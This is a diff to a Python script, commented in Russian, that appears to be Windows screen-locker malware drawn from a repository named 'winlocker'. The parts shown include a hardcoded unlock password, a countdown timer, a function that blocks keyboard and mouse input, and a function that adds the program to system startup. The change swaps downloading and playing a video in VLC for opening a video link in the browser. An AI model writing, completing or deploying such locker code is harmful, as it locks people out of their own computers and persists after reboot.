@@ -1,10 +1,9 @@
-import ctypes, os, sys, time, threading, random, subprocess, urllib.request, tempfile, tkinter as tk
+import ctypes, os, sys, time, threading, random, webbrowser, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-VIDEO_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/bg.mp4"
-VIDEO_FILE = os.path.join(tempfile.gettempdir(), "bg.mp4")
+VIDEO_URL = "https://vk.com/video-30602036_456293338"  # <-- ЗАМЕНИ НА СВОЮ ССЫЛКУ НА MP4
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -38,14 +37,10 @@ def add_to_startup():
     except:
         pass
 
-# === СКАЧИВАЕМ И ЗАПУСКАЕМ ВИДЕО ===
+# === ЗАПУСКАЕМ ВИДЕО В БРАУЗЕРЕ ===
 def play_video():
     try:
-        if not os.path.exists(VIDEO_FILE):
-            urllib.request.urlretrieve(VIDEO_URL, VIDEO_FILE)
-        vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
-        if os.path.exists(vlc_path):
-            subprocess.Popen([vlc_path, "--fullscreen", "--no-video-title-show", VIDEO_FILE])
+        webbrowser.open(VIDEO_URL)
     except:
         pass
 
